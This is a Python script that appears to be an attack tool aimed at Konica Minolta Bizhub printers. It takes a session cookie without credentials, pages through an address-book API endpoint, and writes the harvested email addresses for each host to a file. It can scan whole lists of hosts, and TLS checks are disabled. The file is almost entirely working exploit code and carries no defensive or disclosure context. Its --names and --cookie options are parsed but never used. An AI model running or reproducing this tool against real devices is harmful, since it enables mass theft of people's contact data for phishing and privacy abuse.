#!/usr/bin/env python3
import argparse
import requests
import sys
import json
import os

# Suppress the "InsecureRequestWarning" about verify=False
import warnings
from requests.packages.urllib3.exceptions import InsecureRequestWarning
warnings.simplefilter("ignore", InsecureRequestWarning)

CHUNK_SIZE = 50  # Number of entries to request each time

def parse_args():
    parser = argparse.ArgumentParser(
        description="Chunked Bizhub address book fetch: auto-get or use a known cookie, then fetch in pages of 50."
    )
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("--ip", help="Single IP or hostname.")
    group.add_argument("--list", help="File containing a list of IPs/hosts (one per line).")

    parser.add_argument(
        "-c", "--cookie",
        default=None,
        help="If you already have a valid 'ID=...' cookie, supply it here. Otherwise, the script auto-fetches."
    )
    parser.add_argument(
        "-n", "--names",
        action="store_true",
        help="If set, also dump the list of user names (in addition to emails)."
    )
    parser.add_argument(
        "-d", "--debug",
        action="store_true",
        help="Print debug info, including response details and cookie info."
    )
    return parser.parse_args()

def auto_get_cookie(host, debug=False):
    """
    Attempt to get a cookie, first using HTTPS. If it fails, fall back to HTTP.
    """
    for protocol in ["https", "http"]:
        url = f"{protocol}://{host}/wcd/index.html"
        session = requests.Session()
        try:
            r = session.get(url, verify=False, timeout=10)
            if debug:
                print(f"[DEBUG] GET {url} -> status {r.status_code}")
                print("[DEBUG] Response headers:\n", r.headers)
                print("[DEBUG] Response body:\n", r.text[:400] + ("..." if len(r.text) > 400 else ""))

            r.raise_for_status()
            if "ID" in session.cookies:
                if debug:
                    print(f"[DEBUG] Auto-fetched cookie over {protocol.upper()} for {host}:")
                    for ck in session.cookies:
                        print("   ", ck.name, "=", ck.value)
                return session, protocol  # Return the session and working protocol

        except requests.exceptions.RequestException as e:
            if debug:
                print(f"[DEBUG] Error fetching cookie from {protocol}://{host}: {e}")
            continue  # Try the next protocol

    print(f"[!] Failed to retrieve an ID cookie over both HTTPS and HTTP for {host}.")
    return None, None

def fetch_abbr_chunk(host, protocol, session=None, cookie_value=None, start=1, end=50, debug=False):
    """
    Fetch one chunk (start..end) from /wcd/api/AppReqGetAbbr.
    Uses the working protocol.
    """
    url = f"{protocol}://{host}/wcd/api/AppReqGetAbbr"

    payload = {
        "AbbrListCondition": {
            "WellUse": "false",
            "SearchKey": "None",
            "ObtainCondition": {
                "Type": "IndexList",
                "IndexRange": {
                    "Start": start,
                    "End": end
                }
            },
            "SortInfo": {
                "Condition": "No",
                "Order": "Ascending"
            },
            "AddressKind": "Public",
            "SearchSendMode": "0"
        }
    }

    try:
        if session:
            if debug:
                print(f"[DEBUG] Fetching {start}-{end} using session cookie(s) over {protocol.upper()}.")
            resp = session.post(url, json=payload, verify=False, timeout=15)
        else:
            cookie_dict = {}
            if cookie_value:
                val = cookie_value
                if val.startswith("ID="):
                    val = val[3:]
                cookie_dict["ID"] = val.strip()

            if debug:
                print(f"[DEBUG] Fetching {start}-{end} over {protocol.upper()} with cookie:", cookie_dict)
            resp = requests.post(url, json=payload, cookies=cookie_dict, verify=False, timeout=15)

        if debug:
            print(f"[DEBUG] chunk {start}-{end} -> HTTP {resp.status_code}")
            print("[DEBUG] Response body:", resp.text[:400] + ("..." if len(resp.text) > 400 else ""))

        if resp.status_code == 200:
            try:
                return resp.json()
            except json.JSONDecodeError:
                if debug:
                    print("[DEBUG] JSON decode error for chunk", start, end)
                return None
        else:
            if debug:
                print("[DEBUG] Non-200 status code:", resp.status_code)
                print("[DEBUG] Body snippet:", resp.text[:300])
            return None
    except requests.exceptions.RequestException as e:
        if debug:
            print(f"[DEBUG] RequestException chunk {start}-{end}: {e}")
        return None

def fetch_all_abbr(host, protocol, session=None, debug=False):
    """
    Fetch all address entries in chunks using the detected working protocol.
    """
    all_abbr = []
    current_start = 1

    data = fetch_abbr_chunk(host, protocol, session=session, start=current_start,
                            end=current_start + CHUNK_SIZE - 1, debug=debug)
    if not data:
        return ([], 0)

    abbr_list_data = data.get("MFP", {}).get("AbbrList", {})
    total_size = int(abbr_list_data.get("ArraySize", "0"))

    first_chunk_abbr = abbr_list_data.get("Abbr", [])
    all_abbr.extend(first_chunk_abbr)

    while len(first_chunk_abbr) == CHUNK_SIZE and (total_size > len(all_abbr)):
        current_start += CHUNK_SIZE
        next_end = current_start + CHUNK_SIZE - 1

        data = fetch_abbr_chunk(host, protocol, session=session, start=current_start, end=next_end, debug=debug)
        if not data:
            break

        chunk_abbr = data.get("MFP", {}).get("AbbrList", {}).get("Abbr", [])
        all_abbr.extend(chunk_abbr)

    return (all_abbr, total_size)

def extract_names_and_emails(abbr_entries):
    """
    Extracts names and emails from address book entries.
    """
    names = []
    emails = []

    for entry in abbr_entries:
        name = entry.get("Name", "").strip()
        to_email = entry.get("SendConfiguration", {}).get("AddressInfo", {}).get("EmailMode", {}).get("To", "").strip()

        if name:
            names.append(name)
        if to_email:
            emails.append(to_email)

    return (names, emails)

def process_host(host, debug=False):
    """Handles the full address book extraction for a single host."""
    session, protocol = auto_get_cookie(host, debug=debug)
    if not session:
        return

    abbr_list, array_size = fetch_all_abbr(host, protocol, session=session, debug=debug)

    if not abbr_list:
        print(f"[!] No address book entries found for {host}.")
        return

    names, emails = extract_names_and_emails(abbr_list)

    if not emails:
        print(f"[!] No email addresses found for {host}.")
        return

    email_filename = f"bizhub-addrBk_emailAddr_{host}.txt"
    with open(email_filename, "w", encoding="utf-8") as f:
        for em in sorted(set(emails)):
            f.write(em + "\n")

    print(f"[+] Extracted {len(emails)} email addresses from {host} -> {email_filename}")

def main():
    parser = parse_args()

    hosts = [parser.ip] if parser.ip else open(parser.list).read().splitlines()

    for host in hosts:
        host = host.strip()
        if host:
            process_host(host, debug=parser.debug)

if __name__ == "__main__":
    main()
